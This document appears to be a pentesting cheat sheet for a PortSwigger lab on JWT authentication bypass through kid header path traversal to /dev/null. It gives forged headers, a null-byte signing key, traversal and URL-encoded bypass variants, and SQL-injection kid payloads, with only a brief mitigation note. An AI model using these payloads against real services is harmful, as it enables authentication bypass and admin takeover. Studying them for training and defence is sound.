# JWT attacks - kid header path traversal

The `kid` (Key ID) header parameter is used by the server to look up which key to use for verification. If the server uses the kid value in a file path lookup without sanitization, an attacker can traverse to an arbitrary file - including `/dev/null` (empty/null bytes) - and sign the forged token using null bytes as the HMAC secret.

## Quick reference
```
# kid path traversal -> /dev/null (null-byte HMAC key)

# Step 1: Create null-byte symmetric key in Burp JWT Editor
# New Symmetric Key -> Generate -> replace k value with "" (empty string)
# This represents a key of all null bytes

# Step 2: Modify JWT header
{"alg": "HS256", "kid": "../../../../../../../dev/null"}

# Step 3: Modify payload
{"sub": "administrator", ...}

# Step 4: Sign with the null-byte symmetric key (Don't modify header)
# Server reads /dev/null -> empty file -> null bytes -> same HMAC secret -> signature matches
```

## Root cause
The server constructs a file path like `/var/keys/<kid>` to load the signing key. No sanitization of `../` sequences - path traversal allows pointing to any readable file. `/dev/null` is always empty, so the effective HMAC key is null bytes - a fixed, known value an attacker can replicate.

## Find it
1. Decode JWT header -> look for `kid` parameter.
2. Try changing `kid` to `../../../../../../../dev/null` with a test HS256 token signed with null bytes.
3. If server accepts -> path traversal confirmed.
4. Any predictable file on the server (empty file, known-content file) is also a valid target.

## Technique

**Lab 6 - kid path traversal:**
1. Log in -> grab JWT session cookie.
2. Burp JWT Editor -> New Symmetric Key -> Generate (creates random key) -> replace the `k` value with an empty string `""` -> OK.
   - An empty `k` = null-byte key (base64url of zero bytes).
3. GET /admin in Repeater -> switch to JSON Web Token tab.
4. Header section -> change `kid` value to: `../../../../../../../dev/null`
5. Payload section -> change `sub` to `administrator`.
6. At bottom -> Sign -> Don't modify header -> select the null-byte symmetric key -> OK.
7. Send -> 200 -> find `/admin/delete?username=carlos` -> send -> solved.

## Payload arsenal
```
# kid traversal variants (try depth until accepted)
../../../../../../../dev/null
../../../../dev/null
../../../../../../dev/null

# Other null-byte / empty targets
/dev/null          (Linux empty read)
/proc/sys/kernel/ngroups_max   (predictable numeric content)

# JWT Editor null-byte symmetric key JSON
{"kty": "oct", "k": ""}

# Signed header result
{
  "alg": "HS256",
  "kid": "../../../../../../../dev/null"
}
```

## Bypasses
| Defense | Bypass |
|---|---|
| kid sanitizes `../` | Try URL-encoded: `..%2F..%2F..%2Fdev%2Fnull` |
| kid length limited | Use fewer `../` levels - find minimum depth |
| /dev/null not readable | Try `/proc/version`, known empty app file, or empty log |
| HS256 rejected | If RS256, kid injection may still work if kid used in DB lookup (SQL injection) |

## Exploitation walkthrough
1. JWT has `kid` header -> kid used as file path on server.
2. Null-byte symmetric key (k="") in JWT Editor -> matches HMAC of empty file read.
3. kid = `../../../../../../../dev/null` -> server reads /dev/null -> empty -> null key.
4. HMAC-SHA256(token, null-key) == HMAC-SHA256(token, null-key) -> signature valid.
5. sub=administrator -> /admin accessible -> delete carlos.

## Chaining
- Admin access -> [Access-control](../../Access-control/)
- kid SQL injection (rare): `kid = "x' UNION SELECT 'key' --"` -> SQL injection inside JWT header
- Path traversal in kid -> read sensitive files if server errors leak file content

## Tools
- **Burp JWT Editor** - null-byte symmetric key creation and signing
- **Burp Repeater** - JWT tab for header/payload manipulation

## Labs

### JWT authentication bypass via kid header path traversal [Practitioner]
kid="../../../../../../../dev/null" + null-byte HMAC key (k="") + sub=administrator -> sign -> server reads /dev/null -> HMAC computed with null bytes matches attacker-signed token -> admin access -> delete carlos. Key insight: kid is a path hint to the server, not just metadata - unsanitized path traversal turns it into a file read gadget that undermines the entire signature scheme.

## Real-world notes
- SQL injection via kid is also possible: `kid = "' UNION SELECT 'attackerkey' --"` -> server looks up key from DB with SQL injection.
- `/dev/null` works because empty HMAC key is a fixed, known value - just as bad as no key.
- Any file with predictable content (empty log files, /proc entries, static config files) can be used as the key material.
- Mitigation: allowlist valid kid values or use UUIDs stored in a database with parameterized queries.

## References
- https://portswigger.net/web-security/jwt
